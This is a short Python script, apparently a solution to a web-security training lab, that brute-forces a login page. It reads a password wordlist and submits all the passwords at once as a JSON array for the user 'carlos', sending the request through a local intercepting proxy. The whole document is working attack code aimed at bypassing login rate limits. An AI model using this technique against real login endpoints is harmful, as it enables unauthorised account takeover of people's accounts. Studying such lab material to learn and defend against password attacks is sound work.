import requests
import sys
import urllib3
import time
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"https://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def getpassword(url,user):
    path = "login"
    loop = 0
    passworda = []
    with open('passwords','r') as passwords:
        password = passwords.readlines()        
        for p in password:
            p = p.strip('\n')
            passworda.append(p)
    #print (passworda)
    params = {'username': user, 'password':passworda,'':''}
    r = requests.post(url+path, data=json.dumps(params), verify=False, proxies=proxies)

def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %s <url> " % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("[+] Brute-Forcing login page - all passwords at once")

    getpassword(url,'carlos')

if __name__ == "__main__":
    main()